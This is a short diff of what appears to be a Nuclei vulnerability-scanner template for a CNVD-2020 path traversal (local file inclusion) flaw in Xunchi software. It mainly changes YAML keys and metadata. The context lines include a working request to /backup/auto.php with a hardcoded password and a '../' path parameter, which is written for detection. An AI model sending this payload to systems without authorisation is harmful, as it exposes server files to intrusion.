@@ -12,10 +12,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: xunchi,lfi,cnvd,cnvd2020
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php"
@@ -33,4 +31,4 @@ http:
           - "display_errors"
         condition: and
 
-
+# Enhanced by mp on 2022/07/22
